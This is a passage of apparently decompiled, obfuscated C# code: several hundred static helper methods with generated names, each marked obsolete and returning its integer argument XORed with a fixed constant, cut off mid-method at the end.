	public static int smethod_8408(int int_4)
	{
		return int_4 ^ 0x7B1E163F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8414(int int_4)
	{
		return int_4 ^ 0x127FA3EB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8416(int int_4)
	{
		return int_4 ^ 0x7811BD0C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8417(int int_4)
	{
		return int_4 ^ 0x368C5751;
	}

	[Obsolete("Exclude")]
	public static int smethod_8418(int int_4)
	{
		return int_4 ^ 0x440E8FB5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8419(int int_4)
	{
		return int_4 ^ 0x683043CF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8421(int int_4)
	{
		return int_4 ^ 0x579C9A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8425(int int_4)
	{
		return int_4 ^ 0x41A22733;
	}

	[Obsolete("Exclude")]
	public static int smethod_8426(int int_4)
	{
		return int_4 ^ 0x3BED9CD0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8427(int int_4)
	{
		return int_4 ^ 0x4F9FBD94;
	}

	[Obsolete("Exclude")]
	public static int smethod_8428(int int_4)
	{
		return int_4 ^ 0x27F39A8C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8429(int int_4)
	{
		return int_4 ^ 0x3CB76B2C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8434(int int_4)
	{
		return int_4 ^ 0x7106669F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8436(int int_4)
	{
		return int_4 ^ 0x5C2861E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8437(int int_4)
	{
		return int_4 ^ 0xE9450BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8438(int int_4)
	{
		return int_4 ^ 0x2C416DE4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8440(int int_4)
	{
		return int_4 ^ 0x268ADE4B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8441(int int_4)
	{
		return int_4 ^ 0x1B4F04F0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8444(int int_4)
	{
		return int_4 ^ 0x607D8436;
	}

	[Obsolete("Exclude")]
	public static int smethod_8445(int int_4)
	{
		return int_4 ^ 0x2D814175;
	}

	[Obsolete("Exclude")]
	public static int smethod_8446(int int_4)
	{
		return int_4 ^ 0xDEE74AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8450(int int_4)
	{
		return int_4 ^ 0x40483E78;
	}

	[Obsolete("Exclude")]
	public static int smethod_8451(int int_4)
	{
		return int_4 ^ 0x5F5F9035;
	}

	[Obsolete("Exclude")]
	public static int smethod_8452(int int_4)
	{
		return int_4 ^ 0x602E04CB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8456(int int_4)
	{
		return int_4 ^ 0x4A4D34AC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8457(int int_4)
	{
		return int_4 ^ 0x1344A694;
	}

	[Obsolete("Exclude")]
	public static int smethod_8459(int int_4)
	{
		return int_4 ^ 0x26EAD1C6;
	}

	[Obsolete("Exclude")]
	public static int smethod_8462(int int_4)
	{
		return int_4 ^ 0x5C9FD907;
	}

	[Obsolete("Exclude")]
	public static int smethod_8464(int int_4)
	{
		return int_4 ^ 0x10A94CB2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8466(int int_4)
	{
		return int_4 ^ 0x2ABB943;
	}

	[Obsolete("Exclude")]
	public static int smethod_8468(int int_4)
	{
		return int_4 ^ 0x25236DB1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8469(int int_4)
	{
		return int_4 ^ 0x3BDB44AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8472(int int_4)
	{
		return int_4 ^ 0x64DB9075;
	}

	[Obsolete("Exclude")]
	public static int smethod_8473(int int_4)
	{
		return int_4 ^ 0x2617E9A3;
	}

	[Obsolete("Exclude")]
	public static int smethod_8474(int int_4)
	{
		return int_4 ^ 0x4C98E060;
	}

	[Obsolete("Exclude")]
	public static int smethod_8477(int int_4)
	{
		return int_4 ^ 0x35F6F3AF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8478(int int_4)
	{
		return int_4 ^ 0x15E1148D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8479(int int_4)
	{
		return int_4 ^ 0x173233DA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8480(int int_4)
	{
		return int_4 ^ 0x30F8A724;
	}

	[Obsolete("Exclude")]
	public static int smethod_8481(int int_4)
	{
		return int_4 ^ 0x3D66397E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8483(int int_4)
	{
		return int_4 ^ 0x28A3B869;
	}

	[Obsolete("Exclude")]
	public static int smethod_8486(int int_4)
	{
		return int_4 ^ 0xD8A3ACE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8487(int int_4)
	{
		return int_4 ^ 0x1F7E4E72;
	}

	[Obsolete("Exclude")]
	public static int smethod_8495(int int_4)
	{
		return int_4 ^ 0x77DCCE0B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8498(int int_4)
	{
		return int_4 ^ 0x4BD03FFB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8500(int int_4)
	{
		return int_4 ^ 0x6EA0CF11;
	}

	[Obsolete("Exclude")]
	public static int smethod_8504(int int_4)
	{
		return int_4 ^ 0x12712E5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8507(int int_4)
	{
		return int_4 ^ 0x1D37D063;
	}

	[Obsolete("Exclude")]
	public static int smethod_8512(int int_4)
	{
		return int_4 ^ 0x19282C4D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8513(int int_4)
	{
		return int_4 ^ 0x19809496;
	}

	[Obsolete("Exclude")]
	public static int smethod_8514(int int_4)
	{
		return int_4 ^ 0x1A055066;
	}

	[Obsolete("Exclude")]
	public static int smethod_8516(int int_4)
	{
		return int_4 ^ 0x731805B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8517(int int_4)
	{
		return int_4 ^ 0x49B4C846;
	}

	[Obsolete("Exclude")]
	public static int smethod_8521(int int_4)
	{
		return int_4 ^ 0x1DB5D6F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8522(int int_4)
	{
		return int_4 ^ 0x13DD0470;
	}

	[Obsolete("Exclude")]
	public static int smethod_8524(int int_4)
	{
		return int_4 ^ 0x505352A0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8525(int int_4)
	{
		return int_4 ^ 0xA285F84;
	}

	[Obsolete("Exclude")]
	public static int smethod_8527(int int_4)
	{
		return int_4 ^ 0x5ACCE99F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8528(int int_4)
	{
		return int_4 ^ 0x195ED744;
	}

	[Obsolete("Exclude")]
	public static int smethod_8532(int int_4)
	{
		return int_4 ^ 0x5AF837A7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8533(int int_4)
	{
		return int_4 ^ 0x28AF61AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8535(int int_4)
	{
		return int_4 ^ 0x439BD9EF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8545(int int_4)
	{
		return int_4 ^ 0x572AD460;
	}

	[Obsolete("Exclude")]
	public static int smethod_8547(int int_4)
	{
		return int_4 ^ 0x29A99B80;
	}

	[Obsolete("Exclude")]
	public static int smethod_8549(int int_4)
	{
		return int_4 ^ 0x1C918F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8556(int int_4)
	{
		return int_4 ^ 0x2DBC0C82;
	}

	[Obsolete("Exclude")]
	public static int smethod_8557(int int_4)
	{
		return int_4 ^ 0x25262041;
	}

	[Obsolete("Exclude")]
	public static int smethod_8560(int int_4)
	{
		return int_4 ^ 0x5005E3EA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8561(int int_4)
	{
		return int_4 ^ 0x16D686BC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8563(int int_4)
	{
		return int_4 ^ 0x2A98C0F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8564(int int_4)
	{
		return int_4 ^ 0x3B359D5A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8565(int int_4)
	{
		return int_4 ^ 0x4D210853;
	}

	[Obsolete("Exclude")]
	public static int smethod_8566(int int_4)
	{
		return int_4 ^ 0xA106C0A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8567(int int_4)
	{
		return int_4 ^ 0x5B9242C7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8570(int int_4)
	{
		return int_4 ^ 0x1D457CA5;
	}

	[Obsolete("Exclude")]
	public static int smethod_8572(int int_4)
	{
		return int_4 ^ 0x11497C6F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8573(int int_4)
	{
		return int_4 ^ 0x6C866943;
	}

	[Obsolete("Exclude")]
	public static int smethod_8574(int int_4)
	{
		return int_4 ^ 0x36B5AABE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8575(int int_4)
	{
		return int_4 ^ 0x7EFFF4FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8578(int int_4)
	{
		return int_4 ^ 0x69D75B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8589(int int_4)
	{
		return int_4 ^ 0x54DDDA79;
	}

	[Obsolete("Exclude")]
	public static int smethod_8605(int int_4)
	{
		return int_4 ^ 0x37DA4E89;
	}

	[Obsolete("Exclude")]
	public static int smethod_8608(int int_4)
	{
		return int_4 ^ 0x4E0D8FA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_8611(int int_4)
	{
		return int_4 ^ 0x2870ACAB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8613(int int_4)
	{
		return int_4 ^ 0x3B92FDA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8619(int int_4)
	{
		return int_4 ^ 0x7F465411;
	}

	[Obsolete("Exclude")]
	public static int smethod_8624(int int_4)
	{
		return int_4 ^ 0x6B0E8C9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8625(int int_4)
	{
		return int_4 ^ 0x3791D5F9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8628(int int_4)
	{
		return int_4 ^ 0x57A3FD00;
	}

	[Obsolete("Exclude")]
	public static int smethod_8629(int int_4)
	{
		return int_4 ^ 0x3E545108;
	}

	[Obsolete("Exclude")]
	public static int smethod_8631(int int_4)
	{
		return int_4 ^ 0x3CCE3422;
	}

	[Obsolete("Exclude")]
	public static int smethod_8637(int int_4)
	{
		return int_4 ^ 0x28542D6E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8638(int int_4)
	{
		return int_4 ^ 0x63584599;
	}

	[Obsolete("Exclude")]
	public static int smethod_8640(int int_4)
	{
		return int_4 ^ 0x793A72A2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8643(int int_4)
	{
		return int_4 ^ 0x3C248264;
	}

	[Obsolete("Exclude")]
	public static int smethod_8644(int int_4)
	{
		return int_4 ^ 0x7E6D3680;
	}

	[Obsolete("Exclude")]
	public static int smethod_8645(int int_4)
	{
		return int_4 ^ 0x7ED96DC8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8647(int int_4)
	{
		return int_4 ^ 0x52ADABAA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8648(int int_4)
	{
		return int_4 ^ 0x28092B30;
	}

	[Obsolete("Exclude")]
	public static int smethod_8649(int int_4)
	{
		return int_4 ^ 0x2F12D27C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8652(int int_4)
	{
		return int_4 ^ 0x5EF22231;
	}

	[Obsolete("Exclude")]
	public static int smethod_8653(int int_4)
	{
		return int_4 ^ 0x40129B64;
	}

	[Obsolete("Exclude")]
	public static int smethod_8655(int int_4)
	{
		return int_4 ^ 0x1DB936AE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8658(int int_4)
	{
		return int_4 ^ 0x7DD558C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8659(int int_4)
	{
		return int_4 ^ 0x642B677B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8660(int int_4)
	{
		return int_4 ^ 0x2932F5BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_8661(int int_4)
	{
		return int_4 ^ 0x495B8915;
	}

	[Obsolete("Exclude")]
	public static int smethod_8664(int int_4)
	{
		return int_4 ^ 0x708C0FF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8665(int int_4)
	{
		return int_4 ^ 0x5DEFB536;
	}

	[Obsolete("Exclude")]
	public static int smethod_8666(int int_4)
	{
		return int_4 ^ 0x1790E1E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8668(int int_4)
	{
		return int_4 ^ 0x2DB2394B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8670(int int_4)
	{
		return int_4 ^ 0x3D8975E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8671(int int_4)
	{
		return int_4 ^ 0x4DE17C7B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8676(int int_4)
	{
		return int_4 ^ 0x2601D513;
	}

	[Obsolete("Exclude")]
	public static int smethod_8678(int int_4)
	{
		return int_4 ^ 0x1E8EDEBA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8685(int int_4)
	{
		return int_4 ^ 0x5C94596C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8687(int int_4)
	{
		return int_4 ^ 0x50F59E41;
	}

	[Obsolete("Exclude")]
	public static int smethod_8688(int int_4)
	{
		return int_4 ^ 0x174F16BF;
	}

	[Obsolete("Exclude")]
	public static int smethod_8689(int int_4)
	{
		return int_4 ^ 0x4CC65803;
	}

	[Obsolete("Exclude")]
	public static int smethod_8696(int int_4)
	{
		return int_4 ^ 0x1D6FFD64;
	}

	[Obsolete("Exclude")]
	public static int smethod_8699(int int_4)
	{
		return int_4 ^ 0x265DAF34;
	}

	[Obsolete("Exclude")]
	public static int smethod_8701(int int_4)
	{
		return int_4 ^ 0x6727D020;
	}

	[Obsolete("Exclude")]
	public static int smethod_8703(int int_4)
	{
		return int_4 ^ 0x935BF39;
	}

	[Obsolete("Exclude")]
	public static int smethod_8706(int int_4)
	{
		return int_4 ^ 0x6AE6A4F4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8708(int int_4)
	{
		return int_4 ^ 0x323C6DE9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8709(int int_4)
	{
		return int_4 ^ 0x641D030A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8710(int int_4)
	{
		return int_4 ^ 0x714A3311;
	}

	[Obsolete("Exclude")]
	public static int smethod_8712(int int_4)
	{
		return int_4 ^ 0x58DF0C3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8714(int int_4)
	{
		return int_4 ^ 0x2F923A24;
	}

	[Obsolete("Exclude")]
	public static int smethod_8716(int int_4)
	{
		return int_4 ^ 0x3F655C9D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8718(int int_4)
	{
		return int_4 ^ 0x68459395;
	}

	[Obsolete("Exclude")]
	public static int smethod_8719(int int_4)
	{
		return int_4 ^ 0x57C54D43;
	}

	[Obsolete("Exclude")]
	public static int smethod_8723(int int_4)
	{
		return int_4 ^ 0x2E721FEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8725(int int_4)
	{
		return int_4 ^ 0x18360539;
	}

	[Obsolete("Exclude")]
	public static int smethod_8726(int int_4)
	{
		return int_4 ^ 0x1C618438;
	}

	[Obsolete("Exclude")]
	public static int smethod_8730(int int_4)
	{
		return int_4 ^ 0x22B2BB05;
	}

	[Obsolete("Exclude")]
	public static int smethod_8733(int int_4)
	{
		return int_4 ^ 0x5EDCA0EE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8734(int int_4)
	{
		return int_4 ^ 0x6A9B2E36;
	}

	[Obsolete("Exclude")]
	public static int smethod_8735(int int_4)
	{
		return int_4 ^ 0x17A58747;
	}

	[Obsolete("Exclude")]
	public static int smethod_8738(int int_4)
	{
		return int_4 ^ 0x4080FDA3;
	}

	[Obsolete("Exclude")]
	public static int smethod_8743(int int_4)
	{
		return int_4 ^ 0x7066490F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8744(int int_4)
	{
		return int_4 ^ 0x68FF028C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8752(int int_4)
	{
		return int_4 ^ 0x3A367567;
	}

	[Obsolete("Exclude")]
	public static int smethod_8755(int int_4)
	{
		return int_4 ^ 0x7670458B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8756(int int_4)
	{
		return int_4 ^ 0x92A1AF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8757(int int_4)
	{
		return int_4 ^ 0x6FD97E91;
	}

	[Obsolete("Exclude")]
	public static int smethod_8760(int int_4)
	{
		return int_4 ^ 0x6063B4FE;
	}

	[Obsolete("Exclude")]
	public static int smethod_8761(int int_4)
	{
		return int_4 ^ 0x34D80198;
	}

	[Obsolete("Exclude")]
	public static int smethod_8762(int int_4)
	{
		return int_4 ^ 0x1E408780;
	}

	[Obsolete("Exclude")]
	public static int smethod_8763(int int_4)
	{
		return int_4 ^ 0x7B7541B4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8768(int int_4)
	{
		return int_4 ^ 0x850519E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8769(int int_4)
	{
		return int_4 ^ 0x87A24B2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8770(int int_4)
	{
		return int_4 ^ 0xED1014C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8771(int int_4)
	{
		return int_4 ^ 0x17F65D9E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8773(int int_4)
	{
		return int_4 ^ 0x4B41E1E3;
	}

	[Obsolete("Exclude")]
	public static int smethod_8774(int int_4)
	{
		return int_4 ^ 0x668786D8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8779(int int_4)
	{
		return int_4 ^ 0x35AD106;
	}

	[Obsolete("Exclude")]
	public static int smethod_8781(int int_4)
	{
		return int_4 ^ 0x49B47EDC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8782(int int_4)
	{
		return int_4 ^ 0x2D4DA40B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8784(int int_4)
	{
		return int_4 ^ 0x245B40A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8785(int int_4)
	{
		return int_4 ^ 0x76097C8D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8792(int int_4)
	{
		return int_4 ^ 0x36D333F7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8793(int int_4)
	{
		return int_4 ^ 0x279FDFBB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8796(int int_4)
	{
		return int_4 ^ 0x3AE49F33;
	}

	[Obsolete("Exclude")]
	public static int smethod_8800(int int_4)
	{
		return int_4 ^ 0x35EEA9A1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8802(int int_4)
	{
		return int_4 ^ 0x3BB33FE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8806(int int_4)
	{
		return int_4 ^ 0x4A2AD402;
	}

	[Obsolete("Exclude")]
	public static int smethod_8814(int int_4)
	{
		return int_4 ^ 0x11462CF3;
	}

	[Obsolete("Exclude")]
	public static int smethod_8815(int int_4)
	{
		return int_4 ^ 0x53F0121C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8817(int int_4)
	{
		return int_4 ^ 0x40FDFB18;
	}

	[Obsolete("Exclude")]
	public static int smethod_8818(int int_4)
	{
		return int_4 ^ 0x4C16D083;
	}

	[Obsolete("Exclude")]
	public static int smethod_8819(int int_4)
	{
		return int_4 ^ 0x4347DE90;
	}

	[Obsolete("Exclude")]
	public static int smethod_8821(int int_4)
	{
		return int_4 ^ 0x7FB0EE72;
	}

	[Obsolete("Exclude")]
	public static int smethod_8822(int int_4)
	{
		return int_4 ^ 0x5C39D0D7;
	}

	[Obsolete("Exclude")]
	public static int smethod_8824(int int_4)
	{
		return int_4 ^ 0x6C2AC6E9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8825(int int_4)
	{
		return int_4 ^ 0x58F7F8AB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8826(int int_4)
	{
		return int_4 ^ 0x5FBD565B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8827(int int_4)
	{
		return int_4 ^ 0x16FA94E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8831(int int_4)
	{
		return int_4 ^ 0x66C3DA78;
	}

	[Obsolete("Exclude")]
	public static int smethod_8835(int int_4)
	{
		return int_4 ^ 0x546A42FB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8837(int int_4)
	{
		return int_4 ^ 0x45D6E992;
	}

	[Obsolete("Exclude")]
	public static int smethod_8839(int int_4)
	{
		return int_4 ^ 0xEB3379F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8842(int int_4)
	{
		return int_4 ^ 0x10159C6A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8843(int int_4)
	{
		return int_4 ^ 0x40B20742;
	}

	[Obsolete("Exclude")]
	public static int smethod_8844(int int_4)
	{
		return int_4 ^ 0x72E26104;
	}

	[Obsolete("Exclude")]
	public static int smethod_8845(int int_4)
	{
		return int_4 ^ 0x715D7CB0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8846(int int_4)
	{
		return int_4 ^ 0x7DD15D13;
	}

	[Obsolete("Exclude")]
	public static int smethod_8851(int int_4)
	{
		return int_4 ^ 0x15FCD04B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8852(int int_4)
	{
		return int_4 ^ 0x471F320A;
	}

	[Obsolete("Exclude")]
	public static int smethod_8858(int int_4)
	{
		return int_4 ^ 0x6A402313;
	}

	[Obsolete("Exclude")]
	public static int smethod_8863(int int_4)
	{
		return int_4 ^ 0x130A7818;
	}

	[Obsolete("Exclude")]
	public static int smethod_8864(int int_4)
	{
		return int_4 ^ 0x66854FF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8868(int int_4)
	{
		return int_4 ^ 0x7432E037;
	}

	[Obsolete("Exclude")]
	public static int smethod_8871(int int_4)
	{
		return int_4 ^ 0x70AED38D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8874(int int_4)
	{
		return int_4 ^ 0x32AC2DEC;
	}

	[Obsolete("Exclude")]
	public static int smethod_8877(int int_4)
	{
		return int_4 ^ 0x1DB22186;
	}

	[Obsolete("Exclude")]
	public static int smethod_8878(int int_4)
	{
		return int_4 ^ 0xF6D36E2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8882(int int_4)
	{
		return int_4 ^ 0x4E8C4F71;
	}

	[Obsolete("Exclude")]
	public static int smethod_8884(int int_4)
	{
		return int_4 ^ 0x24C1305B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8885(int int_4)
	{
		return int_4 ^ 0x57754BEA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8888(int int_4)
	{
		return int_4 ^ 0x27371498;
	}

	[Obsolete("Exclude")]
	public static int smethod_8890(int int_4)
	{
		return int_4 ^ 0x7AEB916;
	}

	[Obsolete("Exclude")]
	public static int smethod_8895(int int_4)
	{
		return int_4 ^ 0x2AD68421;
	}

	[Obsolete("Exclude")]
	public static int smethod_8899(int int_4)
	{
		return int_4 ^ 0x4E5B19C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8901(int int_4)
	{
		return int_4 ^ 0x516374BA;
	}

	[Obsolete("Exclude")]
	public static int smethod_8904(int int_4)
	{
		return int_4 ^ 0x182F2920;
	}

	[Obsolete("Exclude")]
	public static int smethod_8906(int int_4)
	{
		return int_4 ^ 0x708E0959;
	}

	[Obsolete("Exclude")]
	public static int smethod_8908(int int_4)
	{
		return int_4 ^ 0x3E63D6E4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8912(int int_4)
	{
		return int_4 ^ 0x4A012205;
	}

	[Obsolete("Exclude")]
	public static int smethod_8913(int int_4)
	{
		return int_4 ^ 0x50F58E0E;
	}

	[Obsolete("Exclude")]
	public static int smethod_8916(int int_4)
	{
		return int_4 ^ 0x577F6178;
	}

	[Obsolete("Exclude")]
	public static int smethod_8917(int int_4)
	{
		return int_4 ^ 0x6F0374C8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8918(int int_4)
	{
		return int_4 ^ 0x1F978727;
	}

	[Obsolete("Exclude")]
	public static int smethod_8923(int int_4)
	{
		return int_4 ^ 0x63DFE0DD;
	}

	[Obsolete("Exclude")]
	public static int smethod_8924(int int_4)
	{
		return int_4 ^ 0x57B0DE55;
	}

	[Obsolete("Exclude")]
	public static int smethod_8928(int int_4)
	{
		return int_4 ^ 0x45DD046F;
	}

	[Obsolete("Exclude")]
	public static int smethod_8929(int int_4)
	{
		return int_4 ^ 0x5A83CEDB;
	}

	[Obsolete("Exclude")]
	public static int smethod_8931(int int_4)
	{
		return int_4 ^ 0x737B8062;
	}

	[Obsolete("Exclude")]
	public static int smethod_8936(int int_4)
	{
		return int_4 ^ 0x7041818;
	}

	[Obsolete("Exclude")]
	public static int smethod_8937(int int_4)
	{
		return int_4 ^ 0x51963CD9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8946(int int_4)
	{
		return int_4 ^ 0x123A9B3B;
	}

	[Obsolete("Exclude")]
	public static int smethod_8947(int int_4)
	{
		return int_4 ^ 0xC67F27D;
	}

	[Obsolete("Exclude")]
	public static int smethod_8950(int int_4)
	{
		return int_4 ^ 0x3F4D66C4;
	}

	[Obsolete("Exclude")]
	public static int smethod_8957(int int_4)
	{
		return int_4 ^ 0x30656448;
	}

	[Obsolete("Exclude")]
	public static int smethod_8958(int int_4)
	{
		return int_4 ^ 0x6A26EAB9;
	}

	[Obsolete("Exclude")]
	public static int smethod_8959(int int_4)
	{
		return int_4 ^ 0x74066076;
	}

	[Obsolete("Exclude")]
	public static int smethod_8963(int int_4)
	{
		return int_4 ^ 0x5D92140;
	}

	[Obsolete("Exclude")]
	public static int smethod_8965(int int_4)
	{
		return int_4 ^ 0x41DF93F2;
	}

	[Obsolete("Exclude")]
	public static int smethod_8969(int int_4)
	{
		return int_4 ^ 0x5AAF99E8;
	}

	[Obsolete("Exclude")]
	public static int smethod_8987(int int_4)
	{
		return int_4 ^ 0x4B91D59C;
	}

	[Obsolete("Exclude")]
	public static int smethod_8990(int int_4)
	{
		return int_4 ^ 0x10A03B0;
	}

	[Obsolete("Exclude")]
	public static int smethod_8997(int int_4)
	{
		return int_4 ^ 0x2645A6F1;
	}

	[Obsolete("Exclude")]
	public static int smethod_8998(int int_4)
	{
		return int_4 ^ 0x1F2CC35E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9000(int int_4)
	{
		return int_4 ^ 0x67DAFA94;
	}

	[Obsolete("Exclude")]
	public static int smethod_9003(int int_4)
	{
		return int_4 ^ 0x7D31BBCF;
	}

	[Obsolete("Exclude")]
	public static int smethod_9006(int int_4)
	{
		return int_4 ^ 0x43B1E527;
	}

	[Obsolete("Exclude")]
	public static int smethod_9009(int int_4)
	{
		return int_4 ^ 0x21600B20;
	}

	[Obsolete("Exclude")]
	public static int smethod_9010(int int_4)
	{
		return int_4 ^ 0x54996806;
	}

	[Obsolete("Exclude")]
	public static int smethod_9021(int int_4)
	{
		return int_4 ^ 0x6C471F15;
	}

	[Obsolete("Exclude")]
	public static int smethod_9023(int int_4)
	{
		return int_4 ^ 0x2E083AED;
	}

	[Obsolete("Exclude")]
	public static int smethod_9031(int int_4)
	{
		return int_4 ^ 0x498334DB;
	}

	[Obsolete("Exclude")]
	public static int smethod_9032(int int_4)
	{
		return int_4 ^ 0x45D4336F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9034(int int_4)
	{
		return int_4 ^ 0x263844AA;
	}

	[Obsolete("Exclude")]
	public static int smethod_9037(int int_4)
	{
		return int_4 ^ 0x31AE896C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9039(int int_4)
	{
		return int_4 ^ 0x58D985FF;
	}

	[Obsolete("Exclude")]
	public static int smethod_9040(int int_4)
	{
		return int_4 ^ 0x402243BD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9042(int int_4)
	{
		return int_4 ^ 0x7F4322A4;
	}

	[Obsolete("Exclude")]
	public static int smethod_9043(int int_4)
	{
		return int_4 ^ 0x71E1835E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9045(int int_4)
	{
		return int_4 ^ 0x2B00DAF9;
	}

	[Obsolete("Exclude")]
	public static int smethod_9049(int int_4)
	{
		return int_4 ^ 0x6C241DDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9052(int int_4)
	{
		return int_4 ^ 0x1E8C39B1;
	}

	[Obsolete("Exclude")]
	public static int smethod_9053(int int_4)
	{
		return int_4 ^ 0x7BC7FCDD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9061(int int_4)
	{
		return int_4 ^ 0x2316B80B;
	}

	[Obsolete("Exclude")]
	public static int smethod_9062(int int_4)
	{
		return int_4 ^ 0x6AF9FE9C;
	}

	[Obsolete("Exclude")]
	public static int smethod_9063(int int_4)
	{
		return int_4 ^ 0x137FB13F;
	}

	[Obsolete("Exclude")]
	public static int smethod_9067(int int_4)
	{
		return int_4 ^ 0x597E96FD;
	}

	[Obsolete("Exclude")]
	public static int smethod_9070(int int_4)
	{
		return int_4 ^ 0x4757D78E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9071(int int_4)
	{
		return int_4 ^ 0x388E2B16;
	}

	[Obsolete("Exclude")]
	public static int smethod_9075(int int_4)
	{
		return int_4 ^ 0x53F46762;
	}

	[Obsolete("Exclude")]
	public static int smethod_9076(int int_4)
	{
		return int_4 ^ 0x49B2517E;
	}

	[Obsolete("Exclude")]
	public static int smethod_9079(int int_4)
	{
		return int_4 ^ 0x7EB27EE8;
	}

	[Obsolete("Exclude")]
	public static int smethod_9083(int int_4)
	{
